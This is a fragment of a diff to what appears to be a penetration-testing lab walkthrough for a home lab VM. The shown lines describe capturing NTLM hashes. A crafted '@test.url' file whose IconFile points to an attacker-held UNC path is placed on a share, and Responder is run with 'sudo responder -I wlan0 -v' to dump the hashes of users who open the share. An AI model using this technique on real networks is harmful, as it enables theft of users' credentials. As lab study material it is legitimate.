@@ -17,7 +17,10 @@ IconFile=\\x.x.x.x\%USERNAME%.icon
 IconIndex=1
 ```
 
-- We can then save the file as `"@test.url"` and upload it to a share (This should be done in the windows system)
+- We can then save the file as `"@test.url"` and upload it to a share on your THEPUNISHER vm (This should be done in the windows system)
+- Then start up responder with the command `sudo responder -I wlan0 -v`
+- Navigate back to that share where the file was uploaded on your THEPUNISHER vm and go back to your terminal where responder is opened, you should see the hashes dumped
+
 
 
 
